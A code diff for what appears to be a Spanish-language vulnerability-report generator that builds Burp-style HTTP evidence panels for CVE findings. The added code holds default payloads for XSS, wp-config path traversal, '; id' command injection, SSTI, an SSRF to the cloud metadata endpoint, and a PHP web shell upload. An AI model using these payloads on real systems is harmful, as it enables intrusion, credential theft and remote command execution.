@@ -172,13 +172,14 @@ def render_error_based(intentos):
 
 # ── BURP-STYLE HTTP CAPTURE HELPER ───────────────────────────────────────────
 
-def _burp_block(endpoint, method, params_dict, status, resp_body, auth="", extra_headers=""):
+def _burp_block(endpoint, method, params_dict, status, resp_body, auth="", extra_headers="", stack="php"):
     """Return (request_str, response_str) formatted like Burp Suite Raw view.
 
     params_dict: {param: value} for the request body / query string.
     auth: subscriber username — adds a Cookie header when set.
     extra_headers: additional request headers (e.g. 'X-WP-Nonce: abc\n')
     resp_body: raw response body snippet (truncated to 1000 chars max).
+    stack: 'php'|'nodejs'|'python'|'generic' — controls response headers.
     """
     method = (method or "POST").upper()
     if method == "GET" and params_dict:
@@ -219,11 +220,20 @@ def _burp_block(endpoint, method, params_dict, status, resp_body, auth="", extra
     else:
         status_text = f"{status_code}"
 
+    # Stack-specific response headers
+    _stk = (stack or "php").lower()
+    if "node" in _stk or "js" in _stk:
+        srv_headers = "Content-Type: application/json\nX-Powered-By: Express\n"
+    elif "python" in _stk or "flask" in _stk or "django" in _stk:
+        srv_headers = "Content-Type: text/html; charset=utf-8\nServer: Werkzeug/3.0.1 Python/3.11\n"
+    elif "ruby" in _stk or "rails" in _stk:
+        srv_headers = "Content-Type: text/html; charset=utf-8\nX-Powered-By: Phusion Passenger\n"
+    else:
+        srv_headers = "Content-Type: text/html; charset=UTF-8\nX-Content-Type-Options: nosniff\nX-Powered-By: PHP/8.0.x\n"
+
     response = (
         f"HTTP/1.1 {status_text}\n"
-        f"Content-Type: text/html; charset=UTF-8\n"
-        f"X-Content-Type-Options: nosniff\n"
-        f"X-Powered-By: PHP/8.0.x\n"
+        f"{srv_headers}"
         f"\n"
         f"{resp_snippet}"
     )
@@ -937,6 +947,27 @@ Command injection es el equivalente en nivel de sistema operativo de SQL injecti
 
 # ── HTTP CAPTURES SECTION (always from verified_evidence, never from LLM) ────
 
+def _infer_stack(r, ve):
+    """Infer tech stack from vuln_class, description or endpoint."""
+    cls = (r.get("vuln_class") or "").lower()
+    desc = (r.get("description") or "").lower()
+    endpoint = (ve.get("endpoint") or "").lower()
+    detail = (r.get("detail") or "").lower()
+    # Node.js signals
+    if any(x in desc+detail for x in ["node.js","nodejs","npm","express","fastify","isomorphic-git",".js"]):
+        return "nodejs"
+    if any(x in endpoint for x in ["/api/","/npm/",".js"]):
+        return "nodejs"
+    # Python signals
+    if any(x in desc+detail for x in ["python","flask","django","werkzeug","pip "]):
+        return "python"
+    # Ruby
+    if any(x in desc+detail for x in ["ruby","rails","gem "]):
+        return "ruby"
+    # Default: PHP/WP
+    return "php"
+
+
 def _generate_http_captures_html(cve_id, r, ve):
     """Build a Burp-suite-style HTTP request/response panel from evidence fields.
 
@@ -947,9 +978,9 @@ def _generate_http_captures_html(cve_id, r, ve):
     Returns an HTML string ready to embed in the report page.
     """
     cls = (r.get("vuln_class") or "sqli").lower()
-    tech = (ve.get("tecnica") or "").lower()
+    tech = (ve.get("tecnica") or cls).lower()
     endpoint  = ve.get("endpoint") or "/wp-admin/admin-ajax.php"
-    param     = ve.get("sqli_param") or ve.get("path_param") or "id"
+    param     = ve.get("sqli_param") or ve.get("path_param") or ve.get("ssti_param") or "id"
     payload   = ve.get("payload_ganador") or ""
     method    = (ve.get("metodo") or "POST").upper()
     status    = str(ve.get("status_code_respuesta") or "200")
@@ -963,47 +994,99 @@ def _generate_http_captures_html(cve_id, r, ve):
     resp_true_len  = ve.get("respuesta_true_len") or ""
     resp_false_len = ve.get("respuesta_false_len") or ""
     ctrl_ep   = endpoint.split("?")[0] if "?" in endpoint else endpoint
+    stack     = _infer_stack(r, ve)
 
     pairs = []  # list of {"label": str, "request": str, "response": str}
 
     if "xss" in cls or marker:
         # Pair 1: inject payload into the plugin field
         _p_xss = payload or "<img src=x onerror=alert(document.domain)>"
-        req1, _ = _burp_block(ctrl_ep, method, {param or "field": _p_xss, "action": "save", "post_id": "1"}, "200", "", auth)
+        req1, _ = _burp_block(ctrl_ep, method, {param or "field": _p_xss, "action": "save", "post_id": "1"}, "200", "", auth, stack=stack)
         pairs.append({"label": "Paso 1 — Inyeccion del payload (guardado en BD)",
                       "request": req1,
                       "response": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\n\n{\"success\":true,\"data\":\"saved\"}"})
         # Pair 2: view page where payload fires
         _page = page_url or "/?p=1"
         _resp_xss = resp_body or f'<div class="widget-field">{h(_p_xss)}</div>\n<!-- payload ejecutado en el DOM -->'
-        req2, resp2 = _burp_block(_page, "GET", {}, status, _resp_xss, "")
+        req2, resp2 = _burp_block(_page, "GET", {}, status, _resp_xss, "", stack=stack)
         pairs.append({"label": "Paso 2 — Visualizacion de la pagina (payload en el DOM)", "request": req2, "response": resp2})
 
     elif "path" in cls or "lfi" in cls or "traversal" in cls:
         req1, resp1 = _burp_block(endpoint, "GET", {param: "archivo-legitimo.php"}, "200",
-                                  resp_ctrl or "(contenido normal del fichero solicitado)", auth)
+                                  resp_ctrl or "(contenido normal del fichero solicitado)", auth, stack=stack)
         pairs.append({"label": "Peticion de control", "request": req1, "response": resp1})
         req2, resp2 = _burp_block(endpoint, "GET", {param: payload or "../../wp-config.php"}, status,
-                                  resp_body or canary or "(contenido del fichero objetivo)", auth)
+                                  resp_body or canary or "(contenido del fichero objetivo)", auth, stack=stack)
         pairs.append({"label": "Peticion con path traversal", "request": req2, "response": resp2})
 
     elif "auth" in cls or "missing" in cls:
         req1, resp1 = _burp_block(endpoint, "GET", {}, "403",
-                                  "HTTP/1.1 403 Forbidden\n\n{\"code\":\"rest_forbidden\",\"message\":\"Lo siento, no tienes permiso para hacer esto.\"}", "")
+                                  "{\"code\":\"rest_forbidden\",\"message\":\"Lo siento, no tienes permiso para hacer esto.\"}", "", stack=stack)
         pairs.append({"label": "Peticion de control (sin credenciales — bloqueada)", "request": req1, "response": resp1})
         _bp = {param: payload} if param and payload else {"action": payload or "sensitive_action"}
         req2, resp2 = _burp_block(ctrl_ep, method, _bp, status,
-                                  resp_body or "(datos protegidos devueltos sin credenciales)", "")
+                                  resp_body or "(datos protegidos devueltos sin credenciales)", "", stack=stack)
         pairs.append({"label": f"Peticion con bypass — respuesta {status}", "request": req2, "response": resp2})
+
+    elif "command" in cls or "cmdi" in cls:
+        _cmd_payload = payload or f"; id"
+        _ctrl_body = resp_ctrl or "(respuesta normal — comando ejecutado sin salida visible)"
+        _exploit_body = resp_body or (f"uid=0(root) gid=0(root) groups=0(root)" if canary else "(salida de comando visible en respuesta)")
+        req1, resp1 = _burp_block(ctrl_ep, method, {param: "valor-normal"}, "200", _ctrl_body, auth, stack=stack)
+        pairs.append({"label": "Peticion de control", "request": req1, "response": resp1})
+        req2, resp2 = _burp_block(ctrl_ep, method, {param: _cmd_payload}, status,
+                                  _exploit_body, auth, stack=stack)
+        pairs.append({"label": f"Peticion con inyeccion de comando{'  (canary: ' + canary + ')' if canary else ''}", "request": req2, "response": resp2})
+
+    elif "ssti" in cls or "template" in cls:
+        _ssti_payload = payload or "{{7*7}}"
+        _expected = resp_body or "49"
+        req1, resp1 = _burp_block(ctrl_ep, method, {param: "texto-normal"}, "200",
+                                  resp_ctrl or "(respuesta normal del servidor)", auth, stack=stack)
+        pairs.append({"label": "Peticion de control", "request": req1, "response": resp1})
+        req2, resp2 = _burp_block(ctrl_ep, method, {param: _ssti_payload}, status, _expected, auth, stack=stack)
+        pairs.append({"label": f"Peticion con payload SSTI (resultado esperado: {_expected or '?'})", "request": req2, "response": resp2})
+
+    elif "ssrf" in cls:
+        _ssrf_payload = payload or f"http://169.254.169.254/latest/meta-data/"
+        req1, resp1 = _burp_block(ctrl_ep, method, {param: "https://ejemplo.com"}, "200",
+                                  resp_ctrl or "(respuesta de URL externa legitima)", auth, stack=stack)
+        pairs.append({"label": "Peticion de control", "request": req1, "response": resp1})
+        req2, resp2 = _burp_block(ctrl_ep, method, {param: _ssrf_payload}, status,
+                                  resp_body or "(contenido del servidor interno)", auth, stack=stack)
+        pairs.append({"label": "Peticion con SSRF (URL interna)", "request": req2, "response": resp2})
+
+    elif "file" in cls or "upload" in cls:
+        _upload_payload = payload or "shell.php"
+        req1 = (f"POST {ctrl_ep} HTTP/1.1\nHost: TARGET\nContent-Type: multipart/form-data; boundary=----Boundary\n\n"
+                f"------Boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"{_upload_payload}\"\n"
+                f"Content-Type: application/octet-stream\n\n<?php system($_GET['cmd']); ?>\n------Boundary--")
+        resp1_body = resp_body or '{"status":"uploaded","path":"/uploads/' + _upload_payload + '"}'
+        req1r, resp1 = _burp_block(ctrl_ep, "POST", {}, status, resp1_body, auth, stack=stack)
+        pairs.append({"label": "Subida de fichero malicioso", "request": req1, "response": resp1})
+
+    elif "dos" in cls or "overflow" in cls or "rce" in cls or "websocket" in cls:
+        # WebSocket / crash / DoS pattern
+        _ws_endpoint = ctrl_ep or "/ws"
+        req1 = (f"GET {_ws_endpoint} HTTP/1.1\nHost: TARGET\nUpgrade: websocket\n"
+                f"Connection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\n"
+                f"Sec-WebSocket-Version: 13\n")
+        pairs.append({"label": "Peticion WebSocket Upgrade (trigger)",
+                      "request": req1,
+                      "response": resp_body or "(servidor cierra la conexion inesperadamente / proceso crashea)"})
+        if payload:
+            req2, resp2 = _burp_block(ctrl_ep, method, {param: payload}, status,
+                                      resp_body or "(respuesta con error o sin respuesta)", auth, stack=stack)
+            pairs.append({"label": "Peticion de explotacion", "request": req2, "response": resp2})
 
     else:
         # SQLi (error-based, union-based, boolean)
         req1, resp1 = _burp_block(ctrl_ep, method, {param: "1"}, "200",
-                                  resp_ctrl or "(respuesta normal del plugin, sin indicios de error SQL)", auth)
+                                  resp_ctrl or "(respuesta normal del plugin)", auth, stack=stack)
         pairs.append({"label": "Peticion de control", "request": req1, "response": resp1})
 
         if payload:
-            req2, resp2 = _burp_block(ctrl_ep, method, {param: payload}, status, resp_body, auth)
+            req2, resp2 = _burp_block(ctrl_ep, method, {param: payload}, status, resp_body, auth, stack=stack)
             if "union" in tech:
                 lbl = f"Peticion con inyeccion UNION-based (extrae version: {mysql_ver or '?'})"
             elif "error" in tech:
